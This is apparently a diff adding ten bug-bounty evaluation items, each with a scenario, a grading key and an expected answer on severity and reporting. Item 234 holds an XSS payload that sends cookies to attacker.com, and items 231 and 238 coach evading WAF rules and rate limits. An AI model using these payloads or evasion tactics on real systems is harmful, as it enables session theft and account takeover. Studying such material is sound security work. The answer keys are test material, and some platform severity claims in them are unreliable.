@@ -2428,5 +2428,135 @@
       "Predicts P1-P2 payout by arguing public prerequisites undermine authentication; appeals if program rates as P3."
     ],
     "category": "bounty_patterns"
+  },
+  {
+    "id": 231,
+    "scenario": "A REST API endpoint deserializes user-supplied JSON into a Python object using pickle.loads(). An attacker can craft a malicious serialized object that executes arbitrary Python code when deserialized. The endpoint is accessible only to authenticated users, but an attacker can automate account creation and token generation to gain the required session.",
+    "prompt": "Is this truly P1, and how do you prove reproducibility without triggering WAF detection or auth rate limits?",
+    "expected_answer": "This is a P1 remote code execution (RCE), but reproducibility testing is complex. The attack chain requires: (1) account creation, (2) authentication, (3) crafted pickle payload delivery. Each step may have rate limits, bot detection, or WAF rules. To demonstrate without triggering defenses: use the legitimate signup flow with unique emails, craft a minimal non-obvious pickle gadget chain (not just os.system), time requests to avoid pattern matching, and document the full end-to-end proof in a recorded video. Avoid submitting raw pickle payloads\u2014instead show the decoded representation via pickletools. Many programs accept RCE reports even without live execution proof if the deserialization logic is auditable and gadget chains are publicly documented. This avoids duplicate 'unproven RCE' rejections by demonstrating feasibility via code audit combined with timing-safe automation.",
+    "reasoning_requirement": "Balance proof of concept complexity against program tolerance for RCE reproducibility; identify rate-limit evasion strategies; distinguish from 'unproven gadget chain' duplicates.",
+    "evaluation_criteria": [
+      "Specifies exact pickle gadget chain or auditable code path with pickletools output, not generic 'arbitrary code' claims",
+      "Describes rate-limit and auth detection evasion using unique identifiers, timing delays, and account creation patterns",
+      "Explains why video proof or pickletools analysis suffices versus live code execution on shared infrastructure"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 232,
+    "scenario": "A 2FA verification endpoint accepts a 6-digit code. The server responds 'Invalid code' after 3 failed attempts, but timing analysis reveals the response time differs by ~50ms when the first 3 digits are correct (early digit validation). An attacker can use this timing side-channel to brute-force the code in 1000 requests instead of 1 million.",
+    "prompt": "What is the true severity here\u2014P2 or P3? How do you structure the report to avoid 'weak OTP' duplicates?",
+    "expected_answer": "This is a P2 authentication bypass (not P3, because it reduces 2FA to a single round-trip with measurable success rate). Unlike weak static OTPs, this is a **timing oracle**: the vulnerability stems from variable validation latency, not weak entropy. To avoid duplicates: (1) clearly distinguish from 'brute-force OTP' by quantifying the timing delta and its consistency across 100+ requests, (2) provide a statistical test (e.g., t-test on response times) showing the difference is significant and not noise, (3) include a Burp macro or Python script that automates the timing measurement reproducibly. Programs like HackerOne and Bugcrowd classify timing oracles as P2 when they reduce attack complexity materially. The key is proving **reproducibility of the timing signal** through statistical evidence. Include variance data (min/max/stddev of response times) and automated detection logic. This distinguishes it from 'random timing jitter' false positives and common 'weak OTP' duplicates.",
+    "reasoning_requirement": "Quantify timing variance; prove statistical significance; distinguish oracle from noise; demonstrate reproducibility framework.",
+    "evaluation_criteria": [
+      "Provides quantified timing delta (milliseconds) with statistical test across \u2265100 samples showing p-value < 0.05",
+      "Includes automated reproduction code (Burp macro or Python) with documented consistent results across \u22653 independent runs",
+      "Clearly separates timing oracle attack from brute-force OTP and references program-specific timing oracle acceptance policies"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 233,
+    "scenario": "An API endpoint returns detailed error messages: 'Database connection failed: timeout after 5s on 192.168.1.50:5432' or 'Redis cache miss for user:12345 (key length: 8 chars)'. These errors reveal internal IP addresses, service topology, and data structure patterns. Errors are unauthenticated and accessible to all users.",
+    "prompt": "Is this P3 or P4? How does program-specific guidance (Intigriti vs. HackerOne) affect severity classification?",
+    "expected_answer": "This is typically classified as P4 (information disclosure, low business impact) on most platforms. However, Intigriti often accepts it as P3 if the disclosed IPs enable follow-up network reconnaissance or service enumeration (e.g., nmap against the revealed 192.168.x.x range). HackerOne generally rates it P4 unless errors leak PII or cryptographic material. The key distinction: (1) **Information enablement**: does this error directly reduce attack complexity for a second vulnerability? For example, revealing Redis version 6.0.0 enables targeting CVE-2022-XXXXX. (2) **Bugcrowd context**: stricter programs may rate pure topology disclosure as P5 unless paired with other findings. To avoid P5 rejections, always document the **follow-up attack chain** that the information enables. Instead of submitting 'API leaks IPs', submit 'API leaks Redis version 6.0.0 which is vulnerable to CVE-2022-XXXXX; attacker can extract session keys via exploitation.' This transforms information disclosure into a stepping stone for a higher-severity finding with quantifiable impact.",
+    "reasoning_requirement": "Map information disclosure to downstream attack enablement; recognize platform-specific severity thresholds; chain findings strategically.",
+    "evaluation_criteria": [
+      "Identifies specific downstream vulnerability enabled by leaked information (public CVE with CVSS, service version, PII type)",
+      "Cites program-specific guidance from submitted scope (HackerOne vs Bugcrowd vs Intigriti official documentation)",
+      "Provides attack chain proof: reveals \u2192 exploits downstream vulnerability \u2192 demonstrates impact or data access"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 234,
+    "scenario": "A comment section on user profiles allows HTML/JavaScript input. The input is escaped in the initial response but not when retrieved via an AJAX call that uses `.innerHTML` instead of `.textContent`. An attacker can inject `<img src=x onerror='fetch(\"https://attacker.com?cookie=\"+document.cookie)'>` to steal session cookies. The payload is stored in the database (persistent XSS).",
+    "prompt": "This appears to be reflected XSS. How do you determine if it's actually P2 (stored) vs. P3, and how do you avoid 'low-severity XSS' rejections?",
+    "expected_answer": "This is **stored/persistent XSS** (not reflected), classifying it as P2 on most platforms because it affects all users who view the profile. To prove this and avoid P3 misclassification: (1) create two test accounts, inject the payload in account A's profile comment, and verify it executes in account B's session (proves persistence across different user contexts), (2) show the payload in the database via direct SQL query or API request for raw comment data, (3) demonstrate cookie exfiltration with actual session token capture (include screenshot of your attacker.com webhook showing the Base64-encoded cookie). Many programs downgrade XSS to P3 if deemed 'low-impact' (requires JavaScript enabled, no PII). Counter this by proving impact: show that stolen cookies enable password reset, payment method change, or private data access. Include proof video showing the full chain: inject \u2192 view as second user \u2192 cookie sent to attacker \u2192 attacker uses cookie to perform unauthorized action (e.g., change victim's email). This avoids 'XSS without demonstrated impact' rejections.",
+    "reasoning_requirement": "Distinguish persistence from reflection; prove multi-user impact; quantify attack chain end-to-end; measure severity by downstream actions.",
+    "evaluation_criteria": [
+      "Demonstrates payload execution in a different user's session with screenshots showing persistent storage in database",
+      "Includes screenshot/webhook log of attacker infrastructure receiving the exfiltrated session cookie",
+      "Shows downstream impact chain: stolen cookie \u2192 unauthorized action (password reset, account change, payment method, data access)"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 235,
+    "scenario": "A file deletion endpoint accepts a file ID and deletes it if the authenticated user owns the file. However, the permission check (`if user.id == file.owner_id`) and the deletion (`DELETE FROM files WHERE id=?`) are not atomic. An attacker can send 10 parallel requests to delete files owned by other users within a 50ms window before the permission check propagates across database replicas.",
+    "prompt": "What is the exact CVSS score and P-level, and how do you prove this race condition reproducibly?",
+    "expected_answer": "This is a P2 privilege escalation or P3 information disclosure (if files contain sensitive data), depending on whether files are permanently deleted or recoverable. The race condition's reproducibility is **timing-sensitive**: you must synchronize parallel requests to hit the TOCTOU gap between the permission check and deletion. To prove reproducibly: (1) create a test file owned by user B, (2) authenticate as user A, (3) send 10 parallel DELETE requests using a load-testing tool (hey, Apache Bench, or Burp Intruder) within a 100ms window, (4) verify deletion by checking with user B's account, (5) repeat 5 times to show consistency (not a lucky race). Document exact parameters: `hey -n 10 -c 10 https://target/api/files/{id}`. The CVSS score is ~5.5 (privilege escalation without data exposure) or 6.5 if sensitive data is deleted. Many programs accept race conditions with tooling proof (reproducible script) even if one-shot. Include network traces (tcpdump or Burp logs) showing concurrent request arrival and server-side timestamps. This avoids 'unproven race condition' rejections by providing empirical evidence.",
+    "reasoning_requirement": "Quantify the race window (milliseconds); automate parallel request generation; provide statistical evidence of reproducibility; measure timing jitter.",
+    "evaluation_criteria": [
+      "Specifies exact tool and parameters for parallel request generation with documented concurrency level (\u226510 parallel threads)",
+      "Includes network logs or server timestamps proving concurrent request arrival within the window and deletion success",
+      "Demonstrates consistent reproduction across \u22653 independent runs with timing statistics (min/max/mean latency, success rate)"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 236,
+    "scenario": "An internal admin panel is accessible via SSRF through an image proxy endpoint: `GET /proxy?url=http://admin.internal:8080/dashboard`. The proxy fetches and serves any URL, including internal services. An attacker can read the admin dashboard HTML, retrieve API keys from environment variable errors, or trigger actions via GET requests to admin endpoints.",
+    "prompt": "Why might this be P1 on some platforms and P3 on others? How does 'internal vs. external' scope affect payout?",
+    "expected_answer": "SSRF severity hinges on **scope definition and downstream impact**. On HackerOne, SSRF to internal services is typically P2-P3 unless it reaches a cloud metadata endpoint (AWS, GCP) or enables RCE. On Bugcrowd, internal SSRF is often P3-P4 ('internal only, limited business impact'). On Intigriti, the same SSRF might be P2 if the disclosed service can be exploited for account takeover or data exfiltration. Key factors: (1) **Scope definition**: Does the program explicitly exclude 'internal network attacks'? If so, this is out-of-scope or P5. (2) **Downstream impact**: Can you extract secrets? Can you trigger state-changing actions? This lifts it to P2. (3) **Payout signals**: Programs offering $500+ for SSRF typically expect RCE, credential disclosure, or cloud metadata leakage. To maximize payout: go beyond 'I can fetch the admin page'; show exact API keys retrieved, demonstrate their use to perform unauthorized actions, and quantify blast radius ('these keys grant access to 50 customer databases'). This transforms 'generic SSRF' into 'SSRF + credential compromise + multi-customer impact' (P1-P2, $2k+ payout).",
+    "reasoning_requirement": "Map SSRF impact to program-specific scope; quantify data/action disclosure; distinguish from out-of-scope internal-only attacks; identify downstream exploit vectors.",
+    "evaluation_criteria": [
+      "Identifies program's explicit scope statement on 'internal network' attacks from published policy documentation",
+      "Shows extracted credentials or API keys with documented valid use (authentication success, permission validation, resource access)",
+      "Quantifies downstream impact: number of affected systems, customer data accessible, state-changing actions possible, or cloud metadata exposure"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 237,
+    "scenario": "A subdomain (cdn.target.com) points to a third-party CDN (Cloudflare, AWS CloudFront) via a CNAME record. The third-party service was deprovisioned 6 months ago, leaving the CNAME pointing to an inactive endpoint. An attacker re-registers that endpoint by signing up for a free CDN account with the same provider and now serves malicious content on cdn.target.com.",
+    "prompt": "Is this in-scope or out-of-scope? P3 or P5? How do you avoid rejection?",
+    "expected_answer": "Subdomain takeover (SOT) is a **scope-dependent vulnerability**. If the program explicitly includes 'subdomain takeover' in scope (most do on HackerOne, Bugcrowd), this is P3-P4 depending on subdomain purpose: if it serves user-facing content (JS libraries, images), it's P3 (XSS/malware distribution). If it's an unused test subdomain, it's P4. If out-of-scope per rules ('we don't care about unused subdomains'), expect rejection. To avoid P5 rejections: (1) prove the subdomain is **actively accessible and trusted** by users (search JavaScript source, check CT logs for recent SSL certificates, show it in main website navigation), (2) demonstrate actual takeover by uploading a proof file and accessing it via the target domain, (3) quantify impact ('this subdomain serves JavaScript loaded on every user session'). Many programs give low payouts ($50-$300) for unused SOT. To increase payout: show that users' browsers trust the subdomain (HSTS, CSP headers whitelisting it), and demonstrate a real attack (XSS, credential theft). Include screenshots of the subdomain serving your proof file and user-facing pages that reference it.",
+    "reasoning_requirement": "Verify subdomain active-use status and user trust; distinguish high-impact SOT from low-risk unused subdomains; map to program scope; quantify user exposure.",
+    "evaluation_criteria": [
+      "Provides evidence of subdomain active use: CT logs showing recent certificates, references in JavaScript, navigation menus, HSTS headers, or DNS history",
+      "Demonstrates successful takeover via proof file upload and URL access from attacker-controlled provider account with screenshots",
+      "Proves user trust: documents how browsers execute code/load content from subdomain (CSP whitelist, HSTS, frontend references)"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 238,
+    "scenario": "A password reset flow sends a 6-digit code to the user's email. The code doesn't expire server-side, and there's no per-user rate limit on code verification attempts. However, there's a global rate limit of 100 requests/minute across all users. An attacker can enumerate valid user accounts by sending reset requests to a list of emails, then brute-force each code slowly (under the global rate limit) to avoid detection.",
+    "prompt": "How do you structure this report to prove it's an account takeover, not just 'weak rate limiting'?",
+    "expected_answer": "This combines two distinct vectors: **(1) account enumeration** and **(2) brute-force exploitation of non-expiring codes**. To avoid 'weak rate limit' rejection, distinguish it from generic rate-limit flaws by proving the **multi-step attack chain and business impact**. Structure your report: (1) show enumeration results\u2014submit reset requests to 50 emails and document which ones return 'email sent' vs. 'email not found' (proves account enumeration), (2) pick one enumerated account and brute-force the 6-digit code at 1-2 requests/second (respecting global 100/min limit), showing successful code verification and account takeover after ~3000 guesses (6-8 hours at 1 req/sec), (3) provide Python script automating the full chain: enumerate \u2192 wait 1-2 seconds between guesses \u2192 detect success via form behavior ('Password reset successful' vs. 'Invalid code'). Include timing data showing global rate limit isn't triggered. The P-level is **P2** (account takeover via multi-step exploitation), not P3 (enumeration alone). Avoid rejection by proving **automation potential and password reset success**.",
+    "reasoning_requirement": "Decompose multi-step attack; prove each step is necessary; quantify time to takeover; distinguish from generic rate-limit findings; show automation feasibility.",
+    "evaluation_criteria": [
+      "Demonstrates account enumeration with >10 confirmed valid accounts from test email list comparing response codes/message differences",
+      "Shows successful brute-force code verification and password reset completion on a real test account with timeline documentation",
+      "Provides automated exploitation script respecting rate limits and documents expected time-to-compromise (hours/days) with full chain proof"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 239,
+    "scenario": "A GraphQL API endpoint has introspection enabled (no authentication required). The introspection query reveals all available mutations, including an admin-only 'deleteAllUsers' mutation and a 'exportDatabaseBackup' query. Although the mutations are protected by permission checks server-side, the mere existence of these sensitive operations in the schema is considered a security risk by some programs and a non-issue by others.",
+    "prompt": "Is this in-scope? P4 or P5? How do you predict program acceptance?",
+    "expected_answer": "GraphQL introspection disclosure is **highly program-dependent**. HackerOne and Bugcrowd generally classify it as P4-P5 ('information disclosure, low business impact') because revealing a mutation's existence doesn't directly bypass its permission checks. However, some security-forward programs rate it P4 if the schema reveals unusual admin operations that could attract attacker interest. Intigriti sometimes accepts it as P4 if paired with evidence of insufficient permission enforcement. To predict acceptance: (1) check the program's published guidance on 'introspection disclosure' (many state 'informational only, not a security issue'), (2) check their historical accepted reports on HackerOne for GraphQL introspection payouts (usually $0-$100), (3) **avoid submitting introspection alone**; instead, probe the exposed mutations for actual permission bypasses (e.g., call deleteAllUsers without admin token and see if it succeeds). If the permission check is enforced, you have P5 and should expect rejection. If there's a bypass (e.g., the check is bypassable via ID manipulation or role-ID injection), escalate it to P3 (privilege escalation) and mention introspection as the discovery method.",
+    "reasoning_requirement": "Predict program severity thresholds via historical data; pair information disclosure with exploitation proof; distinguish from non-issues; research program-specific acceptance.",
+    "evaluation_criteria": [
+      "Cites program's documented policy on introspection disclosure or references historical payout data from \u22653 public HackerOne reports",
+      "Attempts exploitation of \u22651 admin mutation and documents permission check enforcement or bypass with raw request/response logs",
+      "Pairs introspection discovery with a higher-severity finding (privilege escalation, authorization bypass) or explicitly shows why it's in-scope per program policy"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 240,
+    "scenario": "A payment form stores credit card data in a hidden form field for 'fraud prevention analytics'. The data is logged in server-side access logs in plaintext. While PCI DSS prohibits this, the company claims the logs are 'internal only' and encrypted at rest. An attacker with access to AWS CloudWatch logs (via compromised IAM role or leaked AWS credentials from a different vulnerability) can retrieve thousands of plaintext credit card numbers, expiry dates, and CVV codes.",
+    "prompt": "Is this P1 or P3? How does 'requires prior compromise' affect severity classification?",
+    "expected_answer": "This is **P3** (information disclosure of PCI-regulated data), not P1, because it requires prior access (compromised IAM role). Standalone PCI violations are typically P3-P4 on bug bounty platforms. However, if **you can demonstrate the vulnerability in isolation** (that the log contains plaintext credit card data without requiring prior AWS access), it escalates to P2 because the company is negligently storing PII in violation of PCI DSS requirements. The key distinction: (1) **Standalone finding**: 'Credit card data logged in plaintext by your application server' = P2, even if logs are 'internal only'. (2) **Chained finding**: 'Credit card data + you must compromise IAM role to access it' = P3 (requires prior compromise). To submit as P2 (higher payout, ~$1k+), prove that a normal authenticated user or attacker can trigger application-level logging and access the logs **without needing AWS credentials**. For example, if the form submission triggers a webhook containing plaintext cards in the `logs` parameter, that's P2. Alternatively, demonstrate that the logging level (VERBOSE, DEBUG) is configurable by an attacker via API endpoints, causing unintended data leakage. If you can't avoid the 'internal AWS logs' requirement, submit as P3 and emphasize PCI DSS violation and compliance risk.",
+    "reasoning_requirement": "Distinguish standalone PII leaks from chained vulnerabilities; map to compliance violations; quantify cardholder impact; identify authorization boundary bypass.",
+    "evaluation_criteria": [
+      "Proves credit card logging occurs at the application layer and is accessible without external AWS compromise (or documents full external access chain)",
+      "Cites specific PCI DSS violations (requirement 3.2.1 on data protection, requirement 10 on logging) and compliance implications with regulatory references",
+      "Quantifies exposed cardholder data: sample of plaintext cards with valid format proof (Luhn check), expiry/CVV presence, date range, and remediation cost estimate"
+    ],
+    "category": "bounty_patterns"
   }
 ]
